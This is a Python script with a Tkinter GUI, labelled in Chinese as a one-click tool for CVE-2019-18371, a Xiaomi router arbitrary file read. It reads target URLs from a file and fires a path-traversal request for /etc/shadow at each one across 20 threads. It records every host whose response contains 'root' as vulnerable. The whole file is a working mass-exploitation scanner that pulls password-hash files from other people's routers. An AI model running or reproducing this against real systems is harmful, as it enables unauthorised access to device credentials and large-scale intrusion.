import requests
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def xiaomi_wifi_anyfile_read_cve_2019_18371_exp(url):
    poc = r"""/api-third-party/download/extdisks../etc/shadow"""
    url = url + poc
    try:
        res = requests.get(url, verify=False,timeout=3)
        if "root" in res.text:
            xiaomi_wifi_anyfile_read_cve_2019_18371_text.insert(END,"【！！！！！！】存在漏洞的url：" + url + "\n")
            xiaomi_wifi_anyfile_read_cve_2019_18371_text.see(END)
            with open ("存在小米 路由器 extdisks 任意文件读取漏洞(CVE-2019-18371)的url.txt", 'a') as f:
                f.write(url + "\n")
        else:
            xiaomi_wifi_anyfile_read_cve_2019_18371_text.insert(END,"【×】不存在漏洞的url：" + url + "\n")
            xiaomi_wifi_anyfile_read_cve_2019_18371_text.see(END)
    except Exception as err:
        xiaomi_wifi_anyfile_read_cve_2019_18371_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
        xiaomi_wifi_anyfile_read_cve_2019_18371_text.see(END)
def get_xiaomi_wifi_anyfile_read_cve_2019_18371_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def xiaomi_wifi_anyfile_read_cve_2019_18371_gui():
    xiaomi_wifi_anyfile_read_cve_2019_18371 = tk.Tk()
    xiaomi_wifi_anyfile_read_cve_2019_18371.geometry("910x450")
    xiaomi_wifi_anyfile_read_cve_2019_18371.title("小米 路由器 extdisks 任意文件读取漏洞(CVE-2019-18371)一把梭")
    xiaomi_wifi_anyfile_read_cve_2019_18371.resizable(0, 0)
    xiaomi_wifi_anyfile_read_cve_2019_18371.iconbitmap('logo.ico')
    global xiaomi_wifi_anyfile_read_cve_2019_18371_text
    xiaomi_wifi_anyfile_read_cve_2019_18371_text = scrolledtext.ScrolledText(xiaomi_wifi_anyfile_read_cve_2019_18371,width=123, height=25)
    xiaomi_wifi_anyfile_read_cve_2019_18371_text.grid(row=0, column=0, padx=10, pady=10)
    xiaomi_wifi_anyfile_read_cve_2019_18371_text.see(END)
    addrs = get_xiaomi_wifi_anyfile_read_cve_2019_18371_addr()
    max_thread_num = 20
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(xiaomi_wifi_anyfile_read_cve_2019_18371_exp, addr)
    xiaomi_wifi_anyfile_read_cve_2019_18371.mainloop()